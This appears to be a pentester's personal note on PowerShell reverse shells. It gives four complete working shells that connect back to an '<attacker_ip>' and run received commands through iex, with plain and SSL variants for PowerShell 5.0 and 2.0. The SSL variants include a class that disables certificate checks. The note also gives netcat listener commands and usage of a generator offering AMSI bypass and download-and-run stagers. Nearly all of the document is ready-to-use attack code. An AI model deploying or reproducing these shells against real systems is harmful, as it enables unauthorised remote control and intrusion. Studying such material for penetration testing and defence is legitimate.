
> [!hint]
> My custom reverse shell generator can be found here:
> https://github.com/tylerdotrar/PoorMansArmory
> 
> - PoorMansArmory/revshells/Get-RevShell.ps1
> - PoorMansArmory/revshells/Get-Stager.ps1
> 
> ```powershell
> # Simple PowerShell Reverse Shell (base64)
> Get-RevShell <attacker_ip> <listening_port>
> 
> # Simple PowerShell Reverse Shell (cleartext)
> Get-RevShell <attacker_ip> <listening_port> -Raw
> 
> # PowerShell 2.0 Compatible Reverse Shell w/ Verbose Variables (cleartext)
> Get-RevShell <attacker_ip> <listening_port> -Raw -Verbose -PowerShell2Support
> 
> # SSL Encrypted PowerShell Reverse Shell w/ AMSI Bypass (base64)
> Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass
> 
> # Cleartext Stager pointing to Robust PowerShell Reverse Shell
> Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass -WebClientHelpers > ./downloads/revshell
> Get-Stager http(s)://<attacker_ip>:<attacker_port>/revshell -Raw
> 
> # View all parameters
> Get-RevShell -Help
> Get-Stager -Help
> ```

## Standard Reverse Shell
---
There are only minute payload difference between standard PowerShell 5.0+ and the older PowerShell 2.0 in terms of functionality.  The primary differences are that the PowerShell 5.0+ payloads support information output streams and instantiate classes differently.

In both scenarios, the attacker's listener is the same.

```shell
# Listener with readline wrapper
rlwrap nc -nlvp <listening_port>
```

### PowerShell 5.0 (default)
---

```powershell
# Variables
$IPAddress = '<attacker_ip>'
$Port      = '<listening_port>'

# Reverse Shell
$RevShellClient = [System.Net.Sockets.TCPClient]::new($IPAddress,$Port)
$Stream = $RevShellClient.GetStream()
[byte[]]$DataBuffer = 0..65535 | % {0}
$OutputBuffer = [System.IO.StringWriter]::new()
[System.Console]::SetOut($OutputBuffer)
while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {
    Try {
        $Command = [System.Text.ASCIIEncoding]::new().GetString($DataBuffer,0,$i)
        $CommandOutput = (iex $Command *>&1 | Out-String)
    } Catch {$CommandOutput = "$($Error[0])`n"}
    $OutputBuffer.Write($CommandOutput)
    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> ' 
    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
    $Stream.Flush()
    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
}
$OutputBuffer.Close()
$RevShellClient.Close()
```

### PowerShell 2.0 
---

```powershell
# Variables
$IPAddress = '<attacker_ip>'
$Port      = '<listening_port>'

# Reverse Shell (PowerShell 2.0 Compatible)
$RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient($IPAddress, $Port)
$Stream = $RevShellClient.GetStream()
[byte[]]$DataBuffer = 0..65535 | % {0}
$OutputBuffer = New-Object -TypeName System.IO.StringWriter
[System.Console]::SetOut($OutputBuffer)
while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {
    Try {
        $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$i)
        $CommandOutput = (iex $Command 2>&1 | Out-String)
    } Catch {$CommandOutput = "$($Error[0])`n"}
    $OutputBuffer.Write($CommandOutput)
    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> '
    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
    $Stream.Flush()
    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
}
$OutputBuffer.Close()
$RevShellClient.Close()
```

## SSL Encrypted Reverse Shell
---
By prepending the reverse shell with a custom .NET class that bypasses the self-signed certificate check for SSL streams, you can establish a completely encrypted reverse shell.

> [!info]
> If you would like to take this a step further using assembly reflection, see my [Loading .NET into PowerShell](../15.%20Technique%20Ted%20Talks%20(TTTs)/Loading%20.NET%20into%20PowerShell.md) note.

In both PowerShell 2.0 and 5.0, the attacker's listener is the same.
```shell
# Listener with SSL support and readline wrapper
rlwrap ncat -nlvp <listening_port> --ssl
```

### PowerShell 5.0 (default)
---

```powershell
# Variables
$IPAddress = '<attacker_ip>'
$Port      = '<listening_port>'

# Custom Self-Signed Certificate Bypass .NET Class
$CertificateBypasses = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static SslStream Stream(TcpClient client)
    {
        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
}
'@
Add-Type $CertificateBypasses

# SSL Encrypted Reverse Shell
$RevShellClient = [System.Net.Sockets.TCPClient]::new($IPAddress, $Port)
$Stream = [SelfSignedCerts]::Stream($RevShellClient)
$Stream.AuthenticateAsClient('')
[byte[]]$DataBuffer = 0..65535 | % {0}
$OutputBuffer = [System.IO.StringWriter]::new()
[System.Console]::SetOut($OutputBuffer)
while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {
    Try {
        $Command = [System.Text.ASCIIEncoding]::new().GetString($DataBuffer,0,$i)
        $CommandOutput = (iex $Command *>&1 | Out-String)
    } Catch {$CommandOutput = "$($Error[0])`n"}
    $OutputBuffer.Write($CommandOutput)
    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> '
    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
    $Stream.Flush()
    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
}
$OutputBuffer.Close()
$RevShellClient.Close()
```

### PowerShell 2.0
---

```powershell
# Variables
$IPAddress = '<attacker_ip>'
$Port      = '<listening_port>'

# Custom Self-Signed Certificate Bypass .NET Class
$CertificateBypasses = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static SslStream Stream(TcpClient client)
    {
        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
}
'@
Add-Type $CertificateBypasses

# SSL Encrypted Reverse Shell (PowerShell 2.0 Compatible)
$RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient($IPAddress, $Port)
$Stream = [SelfSignedCerts]::Stream($RevShellClient)
$Stream.AuthenticateAsClient('')
[byte[]]$DataBuffer = 0..65535 | % {0}
$OutputBuffer = New-Object -TypeName System.IO.StringWriter
[System.Console]::SetOut($OutputBuffer)
while (($i = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {
    Try {
        $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$i)
        $CommandOutput = (iex $Command 2>&1 | Out-String)
    } Catch {$CommandOutput = "$($Error[0])`n"}
    $OutputBuffer.Write($CommandOutput)
    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> '
    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
    $Stream.Flush()
    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
}
$OutputBuffer.Close()
$RevShellClient.Close()
```